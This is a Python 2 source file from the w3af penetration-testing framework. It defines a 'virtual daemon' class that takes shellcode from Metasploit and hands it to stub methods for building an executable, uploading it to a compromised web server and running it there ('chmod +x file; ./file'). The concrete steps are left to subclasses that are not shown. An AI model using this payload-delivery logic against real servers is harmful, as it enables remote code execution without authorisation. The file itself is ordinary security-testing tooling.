'''
vdaemon.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

import sys
import socket
from core.controllers.threads.w3afThread import w3afThread
import core.controllers.outputManager as om
from core.controllers.w3afException import *
import re
import traceback

class vdaemon(w3afThread):
    '''
    This class represents a virtual daemon, a point of entry for metasploit plugins to exploit. This class should be
    subclassed into winVd and lnxVd, each implementing a different way of sending the metasploit shellcode
    to the remote web server.
    
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''
    def __init__( self, execMethod ):
        # I'm a thread!
        w3afThread.__init__(self)
        
        # This is the method that will be used to send the metasploit shellcode to the 
        # remote webserver ( using echo $payload > file )
        self._execMethod = execMethod
            
        self._running = False
        self._go = False
        self._ipAddress = ''
        self._localport = 9091
        
    def setListenPort( self, port ):
        self._localport = port
    
    def stop(self):
        om.out.debug('Calling stop of virtual daemon.')
        if self._running:
            self._go = False
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                s.connect(('localhost', self._localport))
                s.close()
            except:
                pass
            self._running = False
            
    def run(self):
        '''
        This is the main loop.
        '''
        self._running = True
        self._go = True

        serversocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
        try:
            serversocket.bind((socket.gethostname(), self._localport))
        except:
            raise w3afException('Vdaemon failed to bind to port: ' + str(self._localport) )
        else:
            om.out.information('Virtual daemon service is running on port '+str(self._localport)+', use metasploit\'s w3af_vdaemon module to exploit it. ')
        serversocket.listen(5)
        
        while self._go:
            #accept connections
            try:
                (clientsocket, address) = serversocket.accept()
            except KeyboardInterrupt, k:
                self.stop()
            except socket.timeout:
                pass
            except Exception, e:
                raise e
            else:
                try:
                    om.out.console('')
                    self._handleMetasploit( clientsocket, address )
                except w3afException, w3:
                    om.out.error('Error: ' + str(w3) )
                except Exception, e:
                    om.out.error('hmmm... unhandled exception in method:  _handleMetasploit() , details: ' + str(e) )
                    om.out.debug( 'Traceback:\n' + str( traceback.format_exc() ) )
    
    def _dump( self, src, length=20 ):
        '''
        prints a hexString
        '''
        FILTER=''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])

        N=0; result=''
        while src:
           s,src = src[:length],src[length:]
           hexa = ' '.join(["%02X"%ord(x) for x in s])
           s = s.translate(FILTER)
           result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
           N+=length
           
        return result
        
    def getIPAddress( self ):
        if self._ipAddress == '':
            raise w3afException('You must set an IP address to use the vdaemon.')
        return self._ipAddress
    
    def setRemoteIP( self, ip ):
        if not re.match('\d?\d?\d?\.\d?\d?\d?\.\d?\d?\d?\.\d?\d?\d?', ip ):
            # It's a hostname, must resolve.
            import socket
            ip = socket.gethostbyname( ip )
        self._ipAddress = ip
        
    def _handleMetasploit( self, clientsocket, address ):
        '''
        Handles a metasploit plugin sending the payload to the virtual server.
        '''
        # Save the variables so anyone can access them
        self._clientsocket = clientsocket
        self._address = address
        
        om.out.debug('Handling metasploit connection.')
        
        hello = '<metasploit-w3af-link>'
        recv = clientsocket.recv( len('<metasploit-w3af-link>') )
        if recv != hello:
            clientsocket.close()
        else:
            # Send the remote IP address
            self._sendToMSF( self.getIPAddress() )
            
            shellcodeLen = clientsocket.recv( 4 )
            shellcodeLen = int( shellcodeLen )
            om.out.debug('The shellcode is '+str(shellcodeLen)+' bytes long.')
            
            shellcode = clientsocket.recv( shellcodeLen )
            om.out.debug('Received the following shellcode from metasploit:')
            om.out.debug( self._dump(shellcode) )
            
            try:
                executableFile = self._generateExe( shellcode )
            except Exception, e:
                raise w3afException( 'Failed to create the executable file, internal error: ' + str(e) )
                clientsocket.close()
                return
            
            try:
                self._sendExeToServer( executableFile )
            except Exception, e:
                raise w3afException( 'Failed to send the executable file to the server, error: ' + str(e) )
            else:
                om.out.information('Successfully transfered the MSF payload to the remote server.')
                
                # Good, the file is there, now execute it!
                try:
                    self._execShellcode()
                except Exception, e:
                    raise w3afException('Failed to execute the executable file on the server, error: ' + str(e) )
                else:
                    om.out.information('Successfully executed the MSF payload on the remote server.')
                    #self._sendToMSF('Success!' )
                    clientsocket.close()
                    
    def _sendToMSF( self, msg ):
        om.out.debug('[vdaemon] Sending: "' + msg + '" to MSF.')
        try:
            self._clientsocket.send( msg )
        except:
            raise w3afException('Failed to send data to metasploit.')
            
    def _generateExe( self, shellcode ):
        '''
        This method should be implemented according to the remote operating system. The idea here
        is to generate an ELF/PE file and return a string that represents it.
        
        This method should be implemented in winVd and lnxVd.
        '''
        raise w3afException('Please implement the _generateExe method.')
        
    def _sendExeToServer( self, exeFile ):
        '''
        This method should be implemented according to the remote operating system. The idea here is to
        send the exeFile to the remote server and save it in a file.
        
        This method should be implemented in winVd and lnxVd.
        '''
        raise w3afException('Please implement the _sendExeToServer method.')
        
    def _execShellcode( self ):
        '''
        This method should be implemented according to the remote operating system. The idea here is to
        execute the payload that was sent using _sendExeToServer and generated by _generateExe . In lnxVd
        I should run "chmod +x file; ./file"
        
        This method should be implemented in winVd and lnxVd.
        '''
        raise w3afException('Please implement the _execShellcode method.')

    def _exec( self, command ):
        '''
        A wrapper for executing commands
        '''
        om.out.debug('Executing: ' + command )
        response = apply( self._execMethod, ( command ,))
        om.out.debug('"' + command + '" returned: ' + response )
        return response
